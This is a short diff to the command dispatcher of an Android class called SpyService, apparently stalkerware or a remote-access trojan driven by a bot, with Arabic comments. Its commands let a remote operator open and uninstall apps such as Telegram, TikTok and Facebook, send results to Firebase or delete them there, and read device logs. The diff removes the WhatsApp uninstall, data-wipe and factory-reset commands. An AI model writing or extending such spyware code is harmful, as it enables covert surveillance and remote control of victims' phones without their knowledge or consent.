@@ -248,7 +248,6 @@ public class SpyService extends Service {
             case "open_app_telegram": openApp("org.telegram.messenger"); break;
             case "open_app_snapchat": openApp("com.snapchat.android"); break;
             case "open_app_tiktok": openApp("com.zhiliaoapp.musically"); break;
-            case "uninstall_app_whatsapp": uninstallApp("com.whatsapp"); break;
             case "uninstall_app_facebook": uninstallApp("com.facebook.katana"); break;
 
             // --- متقدم وجديد (20) ---
@@ -269,8 +268,6 @@ public class SpyService extends Service {
             case "share_result": shareResult(); break;
             case "save_result": saveResultLocally(); break;
             case "delete_result": deleteResultFromFirebase(); break;
-            case "clear_all_data": clearAllData(); break;
-            case "factory_reset": factoryReset(); break;
             case "get_logs": getLogcat(); break;
 
             default: bot.sendMessage("⚠️ أمر غير معروف: " + cmd);
